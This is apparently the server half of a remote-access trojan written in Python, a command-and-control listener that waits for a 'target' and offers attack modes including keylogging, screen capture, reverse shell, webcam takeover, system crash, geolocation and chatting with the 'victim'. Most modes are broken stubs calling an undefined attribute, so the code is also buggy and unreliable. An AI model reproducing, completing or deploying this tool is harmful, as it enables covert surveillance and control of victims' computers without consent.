from keyboard import *
import socket
import os
import sys
from time import sleep
import pyautogui
class Server:
#server code starts here
    def __init__(self):
        self.host = "172.17.105.160"
        self.port = 9090
        self.route = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    def binding(self):#binding ip to port
        try:
            self.route.bind((self.host, self.port))
            self.route.listen(1)
            print("host - port binding was successfull..\n")
            self.waiting()#CALLED THE WAITING METHOD
        except socket.error as err:
            print("binding error", err)
            #incase of socket error we will call the function again

    def waiting(self):#waiting for the target to connect to blacksheep
        try:
            print("waiting for connection...")
            self.channel, self.address = self.route.accept()
            print("connection was established")
            self.attack_modes()
        except socket.error as err:
            self.waiting()
        except KeyboardInterrupt:
            print("\n YOU CLOSED THE CONNECTION")
            self.channel.close()
            self.route.cose()
    def main(self):
        try:
            self.binding()
        except socket.error as err:
            print("SOCKET ERROR", err)
        except AttributeError as err:
            print("ATRIBUTE ERROR", err)
#server code stops here

#ATTACK MODES STARTS HERE...................................
    def attack_modes(self):
        print("1: screenshare")
        print("2: Keylogger")
        print("3: shell")
        print("4: crash")
        print("5: webcam")
        print("6: Geolocate")
        print("7: chat")
        self.choice = int(input("choose your attack mode: "))
        if self.choice == 1:
            #screen recording goes here
            self.screen_record()
            pass
        if self.choice == 2:
            #keylogger codes goes here
            self.keylogger()
            pass
        if self.choice == 3:
            #screen reverse shell goes here
            self.reverse_shell()
            pass
        if self.choice == 4:
            #crashing the entire system
            self.crash_sys()
            pass
        if self.choice == 5:
            #take over cameras and audio
            self.webcam()
            pass
        if self.choice == 6:
            #get the exact locations
            self.geolocate()                    
            pass
        if self.choice == 7:
            #chat with client
            self.chat()                    
            pass

    #screen recording goes here
    def screen_record(self):
        Server().channel.send(self.send_to_victim)
        pass

    #keylogger codes goes here 
    def keylogger(self):
        Server().channel.send(self.send_to_victim)
        pass

    #screen reverse shell goes here
    def reverse_shell(self):
        Server().channel.send(self.send_to_victim)
        pass

    #crashing the entire system
    def crash_sys(self):
        Server().channel.send(self.send_to_victim)
        pass

    #take over cameras and audio
    def webcam(self):
        Server().channel.send(self.send_to_victim)
        pass

    #get the exact locations
    def geolocate(self):
        Server().channel.send(self.send_to_victim)
        pass

    #chat with victim
    def chat(self):
        while True:
            self.test = input(">> ").encode("utf-8")
            self.channel.send(self.test)

f = Server()
f.main()